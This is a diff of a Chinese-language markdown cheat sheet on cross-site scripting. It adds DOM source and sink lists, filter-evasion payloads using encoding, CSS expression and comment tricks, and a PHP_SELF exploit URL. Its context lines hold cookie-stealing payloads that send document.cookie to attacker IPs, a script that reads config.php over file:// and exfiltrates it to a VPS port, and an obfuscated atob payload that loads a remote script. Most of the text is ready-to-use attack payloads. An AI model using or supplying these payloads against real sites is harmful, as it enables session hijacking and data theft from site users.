@@ -1,5 +1,165 @@
 # xss注入
 
+## 不同的xss类型
+
+### 反射型xss
+
+### 储存型xss
+
+### dom xss
+
+客户端产生xss
+
+测试技巧:关注输入和输出
+
+**输入:**
+
+document.URL
+
+document.URLUnencoded
+
+document.location
+
+document.referrer
+
+document.xxxx
+
+window.location
+
+window.name
+
+window.xxxxxx
+
+**输出:**
+
+document.write()
+
+document.writeln()
+
+document.body.innerHtml=...
+
+document.forms[0].action=...
+
+document.attachEvent(...)
+
+document.create...(...)
+
+document.execCommand(...)
+
+document.body. ...
+
+window.attachEvent(...)
+
+document.location=...
+
+document.location.hostname=...
+
+document.location.replace(...)
+
+document.location.assign(...)
+
+document.URL=...
+
+window.navigate(...)
+
+document.open(...)
+
+window.open(...)
+
+window.location.href=...
+
+eval(...)
+
+window.execScript(...)
+
+window.setInterval(...)
+
+window.setTimeout(...)
+
+
+
+
+
+
+
+## xss cheat sheet
+
+http://ha.ckers.org/xss.html
+
+https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+## 绕过xss-filter
+
+### html标签属性执行xss
+
+属性:href,lowsrc,src,bgsound,background,value,action,dynsry
+
+### 空格回车,tab
+
+原理:javascript 引擎对语句的解析
+
+```html
+<img src="javas
+          cript:
+          alert(0)"
+```
+
+### 对标签属性值的转码
+
+html中属性值本身支持ascii码格式
+
+```html
+<img src="javascript:alert(/xss/)">
+变为
+<img src="javascript&#116&#58alert(/xss/)">
+将&#116变为&#000000116也行
+还可以将&#01,&#02等支付插入到javascript或vbscript头部
+```
+
+### 产生自己的事件
+
+onerror,onerror
+
+### 利用css跨站攻击
+
+```css
+<div style="background-image:url(javascript:alert('xss'))"
+<style>
+body{
+    background-image:url("javascript:alert('xss')")
+}
+</style>
+<div style="width:expression(alert('xsss'));">
+<style>
+@import 'javascript:alert()'
+</style>
+```
+
+加载css的方式:
+
+- link标签
+  `<link rel="stylesheet" href="xxxx.css">`
+- @import
+  `<style type='text/css'>@import url(xxxx.css);</style>`
+
+### 扰乱过滤规则
+
+```html
+<img/src="mar.png" alt="mars">
+    样式标签中的/**/和\和\0会被浏览器忽略
+    <img src="java/*exp/**/script:alert();*/ression(alert(0))">
+    @\i\0m\00p\0000\0000\00000r\000000t "url"
+   将css中的关键字进行转码处理,如将e转换成\65
+    <p style="xss:\0065xpression(alert(/xss/))">
+        
+   样式表也支持分析和解释\连接的16进制字符串形式
+        <style>BODY{background:\75\72\6c....}</style>
+```
+
+
+
+
+
 ## 常用的xss语句
 
 读cookie:document.location='http://ip或域名/?'+document.cookie
@@ -26,27 +186,7 @@ xmlhttp.send("url=file:///var/www/html/config.php");
 
 ` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`
 
-## ??
 
-
-
-如果弹窗成功，说明存在xss漏洞，下面是几种常见的跨站攻击方法。
-
-```
-<script>alert(document.cookie)</script>闭合或注释之前的语句"/><script>alert(document.cookie)</script><!----><script>alert(document.cookie)</script><!--
-```
-
- 
-
-其他写法
-
-```
-"onclick="alert(document.cookie)
-</dd><script>alert(/xss/)</script>
-<script>alert(/liscker/);</script>"><img%20src=1%20onerror=alert(1)><marquee/onstart="confirm`1`">< a href=javascript:alert(1)>
-```
-
- 
 
 ## **反射型XSS Poc:**
 
@@ -153,48 +293,29 @@ xmlhttp.send("url=file:///var/www/html/config.php");
 <script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
 ```
 
+## 利用php语言特性
 
+### php
 
- 
+$_SERVER['PHP_SELF']
 
-###  XSS变种
+其中PHP_SELF可以换为:SCRIPT_URI,QUERY_STRING,PATH_INFO等
 
-XSS变种的类型在于JavaScript能执行的位置有多少。
+例子:
 
-　　1）confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。
-
-```
-"/><ScRiPt>confirm(9174)</ScRiPt>
-```
-
-　　2）跳转链接
-
-```
-<a/href=//www.baidu.com/>XssTest</a>
-<a href="javascript:alert(1)">x</a>
+```php
+<form method="POST" action="<?php echo $_SERVER('PHP_SELF')?>">
+</form>
 ```
 
- 　　3）img类型的xss
 
-```
-<img src='#' onerror='alert("XSS")' >
-<img src='' onerror=alert(/poc/)>
-```
 
-　　4）对于过滤<>
+exp:
 
-```
-%27;alert%28/aa/%29;a=%27
-```
+`http://127.0.0.1/1.php/%22%3e%3cscript%3ealert('xss')%3c/script%3e%3cfoo`
 
- 　　5）邮箱系统，存储型
 
-```
-<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
-```
 
- 　　6）inframe框架执行JS
+## xss工具
 
-```
-<iframe src="javascript:alert(1)"></iframe>
-```
+xss-proxy,xssshell,attackapi,anehta,avws
